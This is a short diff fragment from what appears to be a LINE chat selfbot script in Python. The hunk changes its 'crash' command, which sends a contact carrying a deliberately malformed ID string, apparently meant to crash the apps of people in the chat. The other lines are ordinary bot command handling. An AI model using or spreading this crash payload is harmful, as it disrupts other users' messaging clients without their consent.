@@ -746,7 +746,7 @@ def clientBot(op):
                                     client.sendMessage(msg.to, str(e))
 # Pembatas Script #
                             elif cmd == "crash":
-                                client.sendContact(to, "u1f41296217e740650e0448b96851a3e2',")
+                                client.sendContact(to, "u89627a66f352de87a0ca34675ce8e440',")
                             elif cmd.startswith("changename:"):
                                 sep = text.split(" ")
                                 string = text.replace(sep[0] + " ","")
